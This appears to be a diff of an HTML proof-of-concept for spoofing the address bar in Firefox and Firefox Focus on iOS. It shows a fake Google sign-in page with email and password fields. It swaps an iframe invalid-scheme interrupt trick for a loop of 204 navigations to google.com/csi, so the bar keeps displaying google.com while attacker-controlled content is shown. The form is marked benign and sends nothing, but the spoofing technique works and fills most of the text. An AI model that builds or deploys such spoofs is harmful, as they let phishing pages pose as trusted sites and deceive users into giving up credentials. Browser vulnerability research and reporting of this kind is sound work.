@@ -15,11 +15,11 @@
 </style>
 </head>
 <body>
-  <div id="app" class="box">
+  <div class="box">
     <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
     <h1 style="font-weight:400;font-size:1.5rem;margin:.2rem 0">Sign in</h1>
     <p style="color:#5f6368;margin-bottom:1.5rem">Use your Google Account</p>
-    <!-- BENIGN: no submit/collection; marker only. -->
+    <!-- BENIGN: no submit/collection. -->
     <form onsubmit="document.body.innerHTML='<h1>SPOOF PoC: content attacker-controlled</h1>';return false;">
       <input class="in" type="email" placeholder="Email or phone" required>
       <input class="in" type="password" placeholder="Password" required>
@@ -29,32 +29,14 @@
   </div>
 
 <script>
-/* Firefox address-bar spoof test: freeze bar on google.com, then RE-RENDER content.
-   Benign. Tune the delays if the re-render races the interrupt. */
-var SAVED = document.getElementById('app').outerHTML;
-
-// 1) bar -> google.com (204 beacon, no real document swap)
-setTimeout(function () {
-  try { window.open('https://www.google.com/csi', '_self'); } catch (e) {}
-}, 50);
-
-// 2) freeze the pending bar via an invalid-scheme interrupt (your original trick)
-setTimeout(function () {
-  var f = document.createElement('iframe');
-  f.style.display = 'none';
-  f.srcdoc = "<script>setTimeout(function(){location='x://'},40)<\/script>";
-  document.body.appendChild(f);
-}, 70);
-
-// 3) re-render attacker content AFTER the interrupt settles (bar should stay google.com)
-function repaint() {
-  try {
-    if (!document.getElementById('app')) {
-      document.body.innerHTML = SAVED;
-    }
-  } catch (e) {}
-}
-[300, 500, 800, 1200].forEach(function (t) { setTimeout(repaint, t); });
+/* Firefox Focus iOS spoof test — keep bar pending on google.com via a /csi (204) LOOP,
+   so the document is never swapped (204) and the bar keeps showing google.com.
+   No invalid-scheme interrupt -> no render abort. Benign. Bounded ~6s. */
+var n = 0, MAX = 50;
+setTimeout(function tick() {
+  try { location.href = 'https://www.google.com/csi?_=' + Date.now(); } catch (e) {}
+  if (++n < MAX) setTimeout(tick, 120);
+}, 700);
 </script>
 </body>
 </html>
